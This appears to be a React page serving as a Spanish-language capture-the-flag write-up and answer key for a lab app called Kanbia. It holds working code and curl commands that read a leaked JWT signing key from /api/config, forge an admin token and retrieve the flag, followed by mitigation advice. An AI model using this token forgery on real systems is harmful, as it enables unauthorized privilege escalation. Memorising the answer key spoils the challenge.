import { useState } from 'react';

const ATTACKER = { email: 'attacker@kanbia.local', password: 'password123' };
const FLAG_RE = /FLAG\{[a-f0-9]{32}\}/;
const ORIGIN = typeof window !== 'undefined' ? window.location.origin : '';

// ── util JWT (forja HS256 en el navegador con Web Crypto) ─────────────────────
const b64url = (buf: ArrayBuffer | Uint8Array) => {
  const b = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
  let s = ''; for (const x of b) s += String.fromCharCode(x);
  return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
};
const b64urlJson = (o: any) => b64url(new TextEncoder().encode(JSON.stringify(o)));
const decodePayload = (jwt: string) => JSON.parse(atob(jwt.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));

async function forgeJwt(payload: any, secret: string): Promise<string> {
  const head = b64urlJson({ alg: 'HS256', typ: 'JWT' });
  const body = b64urlJson(payload);
  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(`${head}.${body}`));
  return `${head}.${body}.${b64url(sig)}`;
}

interface Step { role: string; method: string; path: string; status: number; note?: string; snippet?: string; bad?: boolean }

async function login() {
  const r = await fetch('/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'omit', body: JSON.stringify(ATTACKER) });
  return (await r.json()).token as string;
}
async function get(path: string, token?: string) {
  const h: Record<string, string> = {}; if (token) h.Authorization = `Bearer ${token}`;
  const r = await fetch(path, { headers: h, credentials: 'omit' });
  return { status: r.status, text: await r.text() };
}
const trim = (s: string, n = 160) => (s.length > n ? s.slice(0, n) + '…' : s).replace(/\s+/g, ' ').trim();

async function run(): Promise<{ ok: boolean; flag?: string; steps: Step[] }> {
  const steps: Step[] = [];
  const tok = await login();
  const payload = decodePayload(tok);
  steps.push({ role: 'atacante', method: 'POST', path: '/api/auth/login', status: 200, note: `sesión de miembro · token: role="${payload.role}"`, snippet: `{ id:${payload.id}, email:"${payload.email}", role:"${payload.role}" }` });

  const denied = await get('/api/org/settings', tok);
  steps.push({ role: 'miembro', method: 'GET', path: '/api/org/settings', status: denied.status, note: 'el rol del token es member → el panel es solo de admins' });

  const cfg = await get('/api/config');
  let secret = '';
  try { secret = JSON.parse(cfg.text).auth.signingKey; } catch { /* */ }
  steps.push({ role: 'atacante', method: 'GET', path: '/api/config', status: cfg.status, note: 'config pública de runtime… incluye la clave de firma JWT', snippet: `auth.signingKey = "${secret}"`, bad: true });

  const forged = await forgeJwt({ id: payload.id, email: payload.email, display_name: payload.display_name, role: 'admin', iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 3600 }, secret);
  steps.push({ role: 'atacante', method: '(forja)', path: 'JWT role="admin" firmado con la clave filtrada', status: 200, note: 'HS256 con el secreto de /api/config', snippet: forged.slice(0, 48) + '…', bad: true });

  const win = await get('/api/org/settings', forged);
  const flag = (win.text.match(FLAG_RE) || [])[0];
  steps.push({ role: 'atacante (admin forjado)', method: 'GET', path: '/api/org/settings', status: win.status, note: 'token admin válido → clave maestra de la organización', snippet: flag ? `masterKey = ${flag}` : trim(win.text), bad: true });
  return { ok: !!flag, flag, steps };
}

function Trace({ steps }: { steps: Step[] }) {
  return (
    <div className="wu-trace">
      {steps.map((s, i) => (
        <div className={`wu-tstep${s.bad ? ' bad' : ''}`} key={i}>
          <div className="wu-treq">
            <span style={{ color: '#8ab4f8', fontSize: 11, background: 'rgba(138,180,248,.14)', padding: '1px 7px', borderRadius: 999 }}>{s.role}</span>
            <span className="wu-verb">{s.method}</span>
            <span className="wu-path">{s.path}</span>
            <span className={`wu-status s${Math.floor(s.status / 100)}`}>{s.status}</span>
          </div>
          {s.note && <div className="wu-tnote">↳ {s.note}</div>}
          {s.snippet && <pre className="wu-tsnip">{s.snippet}</pre>}
        </div>
      ))}
    </div>
  );
}

export default function WriteupPage() {
  const [res, setRes] = useState<any>(null);
  const [state, setState] = useState<'idle' | 'run' | 'ok' | 'fail'>('idle');
  async function go() {
    setState('run'); setRes(null);
    try { const r = await run(); setRes(r); setState(r.ok ? 'ok' : 'fail'); }
    catch (e: any) { setRes({ steps: [], error: String(e?.message || e) }); setState('fail'); }
  }
  const curl = `# 1) login como miembro → 403 en el panel de admin\ncurl -s ${ORIGIN}/api/org/settings -H "Authorization: Bearer <MIEMBRO>"   # 403\n# 2) la config de runtime filtra la clave de firma\ncurl -s ${ORIGIN}/api/config | jq .auth.signingKey\n# 3) forja un JWT role=admin firmado con esa clave (jwt.io o script) y úsalo\ncurl -s ${ORIGIN}/api/org/settings -H "Authorization: Bearer <ADMIN_FORJADO>" | jq .masterKey  # FLAG`;

  return (
    <div className="wu2">
      <div className="wu2-badge">WRITEUP · answer-key</div>
      <h1>Kanbia — me hice administrador firmando mi propio token</h1>
      <p className="muted">Un miembro normal escala a administrador porque el servidor <b>filtra su clave de firma JWT</b> en <code>/api/config</code>. Con ella se forja un token <code>role="admin"</code> válido y se accede a la clave maestra de la organización (la flag). El botón ejecuta el ataque real (forja el JWT en el navegador con Web Crypto).</p>

      <div className="wu-vec">
        <div className="wu-vhead"><span className="wu-num">1</span><b>Divulgación de la clave de firma → escalada de privilegios (JWT)</b><span className="wu-cwe">CWE-798 · CWE-347</span></div>
        <p className="wu-theory">El panel <code>/api/org/settings</code> valida bien el rol del token (403 a miembros). El fallo está en <code>/api/config</code>: expone <code>auth.signingKey</code>. Con esa clave, cualquiera firma un JWT con <code>role:"admin"</code> que el servidor acepta como válido.</p>
        <pre className="wu-code">{curl}</pre>
        <div className="wu-actions">
          <button className="btn small" onClick={go} disabled={state === 'run'}>{state === 'run' ? 'Ejecutando…' : '▶ Reproducir contra la app'}</button>
          {state === 'ok' && <span className="wu-ok">✓ flag obtenida</span>}
          {state === 'fail' && <span className="wu-bad">✗ revisa el estado del lab (make reset)</span>}
        </div>
        {res && <><Trace steps={res.steps} />{res.flag && <div className="wu-flag">🏁 {res.flag}</div>}</>}
      </div>

      {res?.flag && <div className="wu2-flagbanner"><span>Flag capturada</span><code>{res.flag}</code></div>}

      <div className="wu-vec">
        <div className="wu-vhead"><b>Mitigación</b></div>
        <ul style={{ fontSize: 14, lineHeight: 1.7, color: 'var(--ink-2)' }}>
          <li>Nunca expongas secretos de servidor en un endpoint/config que llega al cliente. <code>/api/config</code> solo debe traer datos públicos.</li>
          <li>Firma los tokens con una clave larga y aleatoria que viva solo en el servidor (secret manager), y rótala.</li>
          <li>Defensa en profundidad: no confíes solo en el <code>role</code> del JWT para acciones sensibles; revalida contra la BD.</li>
        </ul>
      </div>
    </div>
  );
}
